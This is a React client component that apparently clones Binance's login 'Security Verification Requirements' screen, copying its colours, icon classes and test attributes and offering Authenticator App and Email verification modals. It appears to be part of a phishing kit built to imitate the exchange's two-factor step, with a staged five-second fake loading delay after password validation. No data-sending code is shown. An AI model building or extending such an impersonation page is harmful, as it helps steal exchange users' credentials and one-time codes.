'use client'
import '../globals.css'
import Icon from "./icon"
import { useState, useEffect, useRef } from 'react'
import { useTheme } from '../lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useValidatePassword } from '../hooks/useValidate'
import Modal from './VerificationModal'

export default function LoginForm() {

    const { theme, toggleTheme } = useTheme();
    const [invalid, setInvalid] = useState(false)
    const [visible, setVisible] = useState(false)
    const [modal, setModal] = useState('AuthApp')
    const [displayModal, setDisplayModal] = useState(false)

    function handleDisplayModal(type) {
        setModal(type)
        setDisplayModal(true)
    }

    // useEffect(() => {
    //     const isClickInsideButton = (event) => {
    //         const button = document.querySelector('button[type="button"]');
    //         console.log('button was clicked')
    //         return button && button.contains(event.target);
    //     };

    //     const handleClick = (event) => {
    //         if (!isClickInsideButton(event)) {
    //             setInvalid(false);
    //         }
    //     };

    //     document.addEventListener('click', handleClick);

    //     return () => {
    //         document.removeEventListener('click', handleClick);
    //     };
    // }, []);


    const [isLoading, setIsLoading] = useState(false)
    const [isHovered, setIsHovered] = useState(false)

    const { validatePassword } = useValidatePassword();
    const handlePasswordValidation = () => {
        const isValid = validatePassword(password);
        setInvalid(!isValid);
        console.log('submitted')

        if (isValid) {
            setIsLoading(true);
            setTimeout(() => {
                setIsLoading(false);
            }, 5000);
        }

        return isValid;
    }


    const [padding, setPadding] = useState("80px 24px 54px");

    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };

        // Set initial padding
        handleResize();

        // Add event listener
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
            <Modal modal={modal} setModal={setModal} displayModal={displayModal} setDisplayModal={setDisplayModal} />
            <div className='h-full w-full flex md:justify-center flex-col md:items-center' style={{ padding }}>
                <div className={`md:border  ${theme === 'light' ? 'md:border-[#eaecef]' : 'md:border-[#2b3139]'} rounded-[24px] md:w-[425px] w-full min-h-[fit] md:min-h-[574px] md:px-[40px] md:pt-[40px] md:pb-[40px]`}>
                    <div className='md:mb-[20px] md:p-0 pt-[12px] px-0 pb-[20px]' onClick={toggleTheme}>
                        <Icon />
                    </div>

                    {/* Form heading text */}
                    <div className='flex h-fit flex-col mb-1 md:mb-3 md:mt-[25px]'>
                        <div className='font-[600] md:text-[32px] leading-[40px] text-[28px]'>
                            Security Verification Requirements
                        </div>
                        <p className={`mt-2 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-800'} md:mt-4  text-[14px] md:text-[16px] font-normal`}>You need to complete all of the following verifications to continue.</p>
                    </div>

                    <div className='text-[32px] tracking-[5px] mb-8 font-semibold text-[#F0B90B]'>
                        0/2
                    </div>

                    <div className='flex flex-col w-full items-center space-y-3 sm:space-y-4'>
                        <div className={`h-[72px] md:h-[64px] ${theme === 'dark' ? 'hover:border-white' : 'hover:border-black'} w-full border ${theme === 'dark' ? 'border-[#474D57]' : 'border-gray-300'}  px-[1rem] flex cursor-pointer gap-[.75rem] rounded-[.75rem] items-center`} onClick={() => handleDisplayModal('AuthApp')}>
                            <svg fill="PrimaryText" className="bn-svg w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M18.5 9.5a6.5 6.5 0 11-13 0 6.5 6.5 0 0113 0zm-6.532-3.518a3.5 3.5 0 00-2.485 5.965l.01.01 2.475-2.475v-3.5zM5 18h6v3H5v-3zm8 0h6v3h-6v-3z" fill="currentColor"></path></svg>
                            <div className='flex-1'>Authenticator App</div>
                            <svg fill="PrimaryText" className="bn-svg w-5 h-5 text-[--color-PrimaryText]" data-e2e="btn-mfa-step-undo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M21 11.999l-7.071-7.071-1.768 1.768 4.055 4.054H2.999v2.5h13.216l-4.054 4.053 1.768 1.768L21 12v-.001z" fill="currentColor"></path></svg>
                        </div>

                        <div className={`h-[72px] md:h-[64px] ${theme === 'dark' ? 'hover:border-white' : 'hover:border-black'} w-full border ${theme === 'dark' ? 'border-[#474D57]' : 'border-gray-300'} px-[1rem] flex cursor-pointer gap-[.75rem] rounded-[.75rem] items-center`} onClick={() => handleDisplayModal('Email')}>
                            <svg fill="PrimaryText" className="bn-svg w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M21.5 5h-18v14.4h18V5zm-18 2.7l9 5.728 9-5.728v3.2l-9 5.728-9-5.727V7.7z" fill="currentColor"></path></svg>
                            <div className='flex-1'>Email</div>
                            <svg fill="PrimaryText" className="bn-svg w-5 h-5 text-[--color-PrimaryText]" data-e2e="btn-mfa-step-undo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M21 11.999l-7.071-7.071-1.768 1.768 4.055 4.054H2.999v2.5h13.216l-4.054 4.053 1.768 1.768L21 12v-.001z" fill="currentColor"></path></svg>
                        </div>
                    </div>

                    <div class="flex justify-start md:justify-center mt-5 md:mt-4">
                        <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                            Use Passkeys to Complete Verification
                        </button>
                    </div>
                    <div class="flex justify-start md:justify-center md:mt-2">
                        <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                            Security verification unavailable ?
                        </button>
                    </div>
                </div>
            </div >

            <div className={`text-[14px] ${theme === 'light' ? 'text-gray-500' : 'text-gray-300'} w-full flex justify-center`}>
                <div className='flex items-center items justify-center h-[70px] w-[425px]'>
                    <div className='mx-[9px] cursor-pointer hover:text-[#F0B90B] flex items-center gap-2'
                        onMouseEnter={() => setIsHovered(true)}
                        onMouseLeave={() => setIsHovered(false)}>
                        <svg xmlns="http://www.w3.org/2000/svg"
                            height="12px"
                            viewBox="0 -960 960 960"
                            width="12px"
                            fill={isHovered ? '#F0B90B' : theme === 'light' ? '#4b5563' : '#d1d5db'}>
                            <path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z" />
                        </svg>
                        English
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Cookies
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Terms
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Privacy
                    </div>
                </div>
            </div>
        </div >
    );
}
